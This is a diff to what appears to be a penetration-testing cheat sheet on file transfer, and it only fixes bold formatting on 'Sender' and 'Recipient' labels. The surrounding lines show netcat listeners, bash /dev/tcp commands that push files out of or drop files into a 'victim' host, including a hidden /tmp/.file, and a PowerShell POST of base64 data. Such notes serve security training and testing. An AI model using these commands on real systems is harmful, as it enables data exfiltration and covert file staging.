@@ -38,20 +38,20 @@ Invoke-RestMethod -Uri http://127.0.0.1/msg -Method POST -Body $base64str
 #### /dev/tcp
 
 
-**Sender:
+**Sender:**
 ```bash
 root@kali:$ nc -w3 -lvnp 1234 < file.txt
 ```
-**Recipient:
+**Recipient:**
 ```bash
 www-data@victim:$ bash -c 'cat < /dev/tcp/127.0.0.1/1234 > /tmp/.file'
 ```
 
-**Recipient:
+**Recipient:**
 ```bash
 root@kali:$ nc -w3 -lvnp 1234 > file.txt
 ```
-**Sender:
+**Sender:**
 ```bash
 www-data@victim:$ bash -c 'cat < file.txt > /dev/tcp/127.0.0.1/1234'
 ```
